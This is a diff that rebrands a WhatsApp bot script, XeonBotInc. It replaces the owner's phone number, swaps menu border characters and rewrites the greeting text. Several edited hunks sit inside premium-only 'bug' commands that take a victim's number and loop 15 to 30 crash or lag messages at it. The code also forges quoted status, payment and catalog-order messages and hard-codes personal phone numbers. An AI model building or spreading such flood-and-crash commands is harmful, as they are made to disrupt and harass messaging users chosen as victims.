@@ -4,7 +4,7 @@
 //Instagram: unicorn_xeon13
 //Telegram: t.me/xeonbotinc
 //GitHub: @DGXeon
-//WhatsApp: +916909137213
+//WhatsApp: +2347082252014
 //want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 require('./lib/listmenu')
@@ -384,7 +384,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
 		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
-		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=2347082252014:2347082252014\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
 	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
 	    const frpayment = {
 	key: {
@@ -603,7 +603,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"𝚁𝙴𝙰𝙳𝚈 𝚃𝙾.𝙻𝙰𝚄𝙽𝙲𝙷..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -1399,7 +1399,7 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, n
             break
             case 'delprem':
                 if (!XeonTheCreator) return XeonStickOwner()
-                if (args.length < 1) return replygcxeon(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 916909137213`)
+                if (args.length < 1) return replygcxeon(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2347082252014`)
                 if (m.mentionedJid.length !== 0) {
                     for (let i = 0; i < m.mentionedJid.length; i++) {
                         premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
@@ -1440,7 +1440,7 @@ replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
 if (!XeonTheCreator) return XeonStickOwner()
-if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 2347082252014`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -1448,11 +1448,11 @@ fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
 replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
 case 'listowner': {
-                let teks = '┌──⭓「 *List Owner* 」\n│\n'
+                let teks = '┌──⭓「 *List Owner* 」\n☘︎\n'
                 for (let x of owner) {
-                    teks += `│⭔ ${x}\n`
+                    teks += `☘︎⭔ ${x}\n`
                 }
-                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
+                teks += `☘︎\n└────────────⭓\n\n*Total : ${owner.length}*`
                 replygcxeon(teks)
             }
             break
@@ -2223,7 +2223,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             case 'invite': {
 	if (!m.isGroup) return XeonStickGroup()
 	if (!isBotAdmins) return XeonStickBotAdmin()
-if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
+if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2347082252014`)
 if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
 if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
 let group = m.chat
@@ -2654,17 +2654,17 @@ break
 *Reason:* ${vote[m.chat][0]}
 
 ┌〔 UPVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][1].length}
-│
-│ 
+☘︎
+☘︎ 
 └────
 
 ┌〔 DOWNVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][2].length}
-│
-│ 
+☘︎
+☘︎ 
 └────
 
 Please Type Below
@@ -2687,17 +2687,17 @@ Please Type Below
 *Reason:* ${vote[m.chat][0]}
 
 ┌〔 UPVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][1].length}
 ${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 ┌〔 DOWNVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][2].length}
 ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 Please Type Below
@@ -2720,17 +2720,17 @@ Please Type Below
 *Reason:* ${vote[m.chat][0]}
 
 ┌〔 UPVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][1].length}
 ${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 ┌〔 DOWNVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${vote[m.chat][2].length}
 ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 Please Type Below
@@ -2749,17 +2749,17 @@ teks_vote = `* VOTE *
 *Reason:* ${vote[m.chat][0]}
 
 ┌〔 UPVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${upvote.length}
 ${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 ┌〔 DOWNVOTE 〕
-│ 
+☘︎ 
 ├ Total: ${devote.length}
 ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
+☘︎ 
 └────
 
 *${prefix}deletevote* - to delete votes
@@ -3314,11 +3314,11 @@ break
                 break
                 //media db
   case 'listbadword':{
-let teks = '┌──⭓「 *VN List* 」\n│\n'
+let teks = '┌──⭓「 *VN List* 」\n☘︎\n'
 for (let x of bad) {
-teks += `│⭔ ${x}\n`
+teks += `☘︎⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
+teks += `☘︎\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
 replygcxeon(teks)
 }
 break
@@ -3723,11 +3723,11 @@ replygcxeon(`Success deleting video ${q}`)
 }
 break
 case 'listvideo':{
-let teks = '┌──⭓「 *Video List* 」\n│\n'
+let teks = '┌──⭓「 *Video List* 」\n☘︎\n'
 for (let x of VideoXeon) {
-teks += `│⭔ ${x}\n`
+teks += `☘︎⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
+teks += `☘︎\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
 replygcxeon(teks)
 }
 break
@@ -3755,11 +3755,11 @@ replygcxeon(`Success deleting image ${q}`)
 }
 break
 case 'listimage':{
-let teks = '┌──⭓「 *Image List* 」\n│\n'
+let teks = '┌──⭓「 *Image List* 」\n☘︎\n'
 for (let x of ImageXeon) {
-teks += `│⭔ ${x}\n`
+teks += `☘︎⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
+teks += `☘︎\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
 replygcxeon(teks)
 }
 break
@@ -3787,11 +3787,11 @@ replygcxeon(`Success deleting sticker ${q}`)
 }
 break
 case 'liststicker':{
-let teks = '┌──⭓「 *Sticker List* 」\n│\n'
+let teks = '┌──⭓「 *Sticker List* 」\n☘︎\n'
 for (let x of StickerXeon) {
-teks += `│⭔ ${x}\n`
+teks += `☘︎⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
+teks += `☘︎\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
 replygcxeon(teks)
 }
 break
@@ -3858,11 +3858,11 @@ replygcxeon(`Success deleting vn ${q}`)
 }
 break
 case 'listvn':{
-let teks = '┌──⭓「 *VN List* 」\n│\n'
+let teks = '┌──⭓「 *VN List* 」\n☘︎\n'
 for (let x of VoiceNoteXeon) {
-teks += `│⭔ ${x}\n`
+teks += `☘︎⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
+teks += `☘︎\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
 replygcxeon(teks)
 }
 break
@@ -3899,11 +3899,11 @@ replygcxeon(`Successfully deleted zip ${teks}`)
 break
 case 'listzip': {
 
-let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
+let teksooooo = '┌──⭓「 *ZIP LIST* 」\n☘︎\n'
 for (let x of ZipXeon) {
-teksooooo += `│⭔ ${x}\n`
+teksooooo += `☘︎⭔ ${x}\n`
 }
-teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
+teksooooo += `☘︎\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
 replygcxeon(teksooooo)
 }
 break
@@ -3940,11 +3940,11 @@ replygcxeon(`Successfully deleted Apk ${teks}`)
 break
 case 'listapk': {
 
-let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
+let teksoooooo = '┌──⭓「 *APK LIST* 」\n☘︎\n'
 for (let x of ApkXeon) {
-teksoooooo += `│⭔ ${x}\n`
+teksoooooo += `☘︎⭔ ${x}\n`
 }
-teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
+teksoooooo += `☘︎\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
 replygcxeon(teksoooooo)
 }
 break
@@ -3981,11 +3981,11 @@ replygcxeon(`Successfully deleted pdf ${teks}`)
 break
 case 'listpdf': {
 
-let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
+let teksoooo = '┌──⭓「 *PDF LIST* 」\n☘︎\n'
 for (let x of DocXeon) {
-teksoooo += `│⭔ ${x}\n`
+teksoooo += `☘︎⭔ ${x}\n`
 }
-teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
+teksoooo += `☘︎\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
 replygcxeon(teksoooo)
 }
 break
@@ -6662,57 +6662,49 @@ case 'blur':
             let latensie = speed() - timestampe
             let a = db.data.users[sender]
             let me = m.sender
-            let xmenu_oh = `┌─❖
-│ Hi 👋 
-└┬❖  ${pushname} 
-┌┤✑  ${xeonytimewisher} 😄${readmore} 
-│└────────────┈ ⳹
-│
-└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
-│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
-│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
-│𝗕𝗼𝘁 : ${botname}
-│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
-│𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
-│𝗠𝗼𝗱𝗲 : ${XeonBotInc.public ? 'Public' : `Self`}
-│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
-│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
-│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
-│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
-│𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
-│
+            let xmenu_oh = ` Anyeong ${pushname} 
+😊${readmore} 
+☘︎
+♲︎︎︎♲︎︎︎𝙳𝚄𝚇 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
+☘︎𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
+☘︎𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
+☘︎𝗕𝗼𝘁 : ${botname}
+☘︎𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
+☘︎𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
+☘︎𝗠𝗼𝗱𝗲 : ${XeonBotInc.public ? 'Public' : `Self`}
+☘︎
 └─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
-│𝗡𝗮𝗺𝗲 : ${pushname}
-│𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
-│𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
-│𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
-│𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
-│
+☘︎𝗡𝗮𝗺𝗲 : ${pushname}
+☘︎𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
+☘︎𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
+☘︎𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
+☘︎𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
+☘︎
 └─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
-│??𝗶𝗺𝗲 : ${xtime}
-│𝗗𝗮𝘁𝗲 : ${xdate}
+☘︎??𝗶𝗺𝗲 : ${xtime}
+☘︎𝗗𝗮𝘁𝗲 : ${xdate}
 └┬───────────────── ⳹
-   │✑  Please Type The *MENU*
-   │✑  Given *BELOW*
+   ☘︎✑  Please Type The *MENU*
+   ☘︎✑  Given *BELOW*
 ┌└─────────────┈ ⳹
-│❏${xprefix}allmenu
-│❏${xprefix}downloadmenu
-│❏${xprefix}funmenu
-│❏${xprefix}aimenu
-│❏${xprefix}groupmenu
-│❏${xprefix}ownermenu
-│❏${xprefix}photooxymenu
-│❏${xprefix}ephoto360menu
-│❏${xprefix}makermenu
-│❏${xprefix}animemenu
-│❏${xprefix}nsfwmenu
-│❏${xprefix}randomphotomenu
-│❏${xprefix}randomvideomenu
-│❏${xprefix}stickermenu
-│❏${xprefix}databasemenu
-│❏${xprefix}stalkermenu
-│❏${xprefix}bugmenu
-│❏${xprefix}othermenu
+☘︎❏${xprefix}allmenu
+☘︎❏${xprefix}downloadmenu
+☘︎❏${xprefix}funmenu
+☘︎❏${xprefix}aimenu
+☘︎❏${xprefix}groupmenu
+☘︎❏${xprefix}ownermenu
+☘︎❏${xprefix}photooxymenu
+☘︎❏${xprefix}ephoto360menu
+☘︎❏${xprefix}makermenu
+☘︎❏${xprefix}animemenu
+☘︎❏${xprefix}nsfwmenu
+☘︎❏${xprefix}randomphotomenu
+☘︎❏${xprefix}randomvideomenu
+☘︎❏${xprefix}stickermenu
+☘︎❏${xprefix}databasemenu
+☘︎❏${xprefix}stalkermenu
+☘︎❏${xprefix}bugmenu
+☘︎❏${xprefix}othermenu
 └─────────────────┈ ⳹`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
@@ -8872,7 +8864,7 @@ replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 min
 break
 case 'pmbug' :{
  if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
  await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -8893,7 +8885,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'delaybug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -8914,9 +8906,9 @@ replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'docubug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
 for (let i = 0; i < amount; i++) {
@@ -8936,7 +8928,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'unlimitedbug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -8957,7 +8949,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'bombug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -8978,7 +8970,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'lagbug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -8999,7 +8991,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'trollybug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 2347082252014`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -9013,7 +9005,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
+"sellerJid": "2347082252014@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -9149,7 +9141,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
+"sellerJid": "2347082252014@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -9757,7 +9749,7 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
     } catch (err) {
         console.log(util.format(err))
         let e = String(err)
-XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+XeonBotInc.sendMessage("2347082252014@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
